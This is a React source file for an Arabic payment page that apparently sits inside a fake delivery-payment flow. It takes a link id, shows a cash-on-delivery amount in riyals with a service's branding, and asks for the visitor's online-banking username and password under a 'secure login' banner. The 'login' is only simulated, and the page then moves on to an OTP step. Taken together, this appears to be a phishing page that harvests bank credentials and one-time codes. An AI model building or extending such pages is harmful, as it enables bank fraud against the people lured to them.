import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
import { getBankById } from "@/lib/banks";

const StandalonePaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;

        const selectedBankId = sessionStorage.getItem('selectedBank') || '';
        const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;

        const handleSubmit = async (e: React.FormEvent) => {
          e.preventDefault();
          setIsSubmitting(true);

          // Simulate login
          await new Promise(resolve => setTimeout(resolve, 1000));

          setIsSubmitting(false);
          navigate(`/standalone-pay/${id}/otp`);
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  {selectedBank && (
                    <div
                      className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
                      style={{
                        background: `linear-gradient(135deg, ${selectedBank.color}, ${branding.colors.secondary})`,
                      }}
                    >
                      <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0">
                        <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
                      </div>
                      <div className="flex-1 text-white">
                        <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
                        <p className="text-lg sm:text-xl font-bold">{selectedBank.nameAr}</p>
                        <p className="text-xs opacity-80">{selectedBank.name}</p>
                      </div>
                    </div>
                  )}

                  <div
                    className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
                    style={{
                      background: `${branding.colors.primary}10`,
                      border: `1px solid ${branding.colors.primary}30`
                    }}
                  >
                    <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
                    <div className="text-xs sm:text-sm">
                      <p className="font-semibold mb-1">تسجيل دخول آمن</p>
                      <p className="text-muted-foreground">
                        سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
                      </p>
                    </div>
                  </div>

                  <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
                    <div>
                      <Label className="mb-2 text-sm sm:text-base">اسم المستخدم</Label>
                      <Input
                        type="text"
                        placeholder="أدخل اسم المستخدم"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="h-12 sm:h-14 text-base sm:text-lg"
                        required
                      />
                    </div>

                    <div>
                      <Label className="mb-2 text-sm sm:text-base">كلمة المرور</Label>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="أدخل كلمة المرور"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="h-12 sm:h-14 text-base sm:text-lg pl-12"
                          required
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                        >
                          {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                        </button>
                      </div>
                    </div>

                    <Button
                      type="submit"
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                      disabled={isSubmitting}
                      style={{
                        background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
                      }}
                    >
                      {isSubmitting ? (
                        <span>جارٍ تسجيل الدخول...</span>
                      ) : (
                        <>
                          <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                          <span>تسجيل الدخول والمتابعة</span>
                          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                        </>
                      )}
                    </Button>
                  </form>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentBankLogin;
